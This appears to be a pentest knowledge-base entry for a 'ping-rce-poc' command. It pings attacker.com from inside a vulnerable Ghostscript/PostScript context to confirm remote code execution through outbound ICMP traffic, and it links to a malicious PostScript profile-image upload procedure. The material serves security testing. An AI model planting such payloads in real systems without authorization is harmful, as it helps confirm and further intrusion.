---
id: cmd-uuid-1
data: ping -c1 attacker.com
tags:
  - rce
  - poc
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:14.787Z'
verified: false
validated: true
submitted: true
---
# ping-rce-poc

## Command

```bash
ping -c1 attacker.com
```

## Description

This command sends a single ICMP echo request to an attacker-controlled host, used as a proof-of-concept payload in PostScript to demonstrate remote code execution without causing harm. Embed it in a vulnerable Ghostscript context to verify server-side execution via outbound network traffic.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-c1` | Count: limits to one ping packet | Yes |
| `attacker.com` | Target host (replace with your domain/IP) | Yes |

## Examples

### Basic Usage

```bash
ping -c1 attacker.com
```

### Advanced Usage

```bash
ping -c1 -W 1 attacker.com  # Add timeout for faster verification
```

## Expected Output

When executed on the target server, no console output is visible to the attacker, but a single ICMP packet is sent to attacker.com. Monitor with tools like tcpdump on the attacker host: "IP server_ip > attacker.com: ICMP echo request". Success indicates RCE achieved.

## Related

- [[Related Procedure: Upload-Malicious-PostScript-as-Profile-Image]]
